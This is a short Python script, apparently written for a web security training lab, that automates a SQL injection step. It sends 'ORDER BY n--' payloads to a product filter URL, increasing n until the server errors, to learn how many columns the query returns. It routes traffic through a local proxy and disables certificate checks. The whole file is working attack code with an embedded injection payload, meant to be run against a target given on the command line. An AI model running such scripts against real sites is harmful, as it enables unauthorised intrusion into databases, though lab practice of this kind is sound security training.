import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def exploit_sqli_column_number(url):
    path = "/filter?category=Gifts"
    for i in range(1,50):
        sql_payload = "'+order+by+%s--" %i
        r = requests.get(url + path + sql_payload, verify=False)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        #payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print('[-] example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    print("[+] Figure out number of columns...")
    num_col = exploit_sqli_column_number(url)

    if num_col:
        print("[+] The number of Columns is " + str(num_col) + ".")
    else:
        print("[-] The SQLi attack was not successful.")